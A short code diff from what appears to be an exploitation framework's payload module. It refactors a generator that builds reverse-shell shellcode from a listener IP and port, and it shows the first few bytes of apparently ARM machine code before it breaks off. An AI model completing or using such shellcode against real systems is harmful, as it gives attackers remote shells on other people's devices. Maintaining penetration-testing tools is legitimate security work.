@@ -27,10 +27,9 @@ class Exploit(payloads.Payload):
     filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
 
     def generate(self):
-        reverse_ip = self.convert_ip(self.lhost)
-        reverse_port = self.convert_port(self.lport)
-
-        self.payload = (
+        reverse_ip = validators.convert_ip(self.lhost)
+        reverse_port = validators.convert_port(self.lport)
+        return (
             "\x01\x10\x8F\xE2" +
             "\x11\xFF\x2F\xE1" +
             "\x02\x20\x01\x21" +
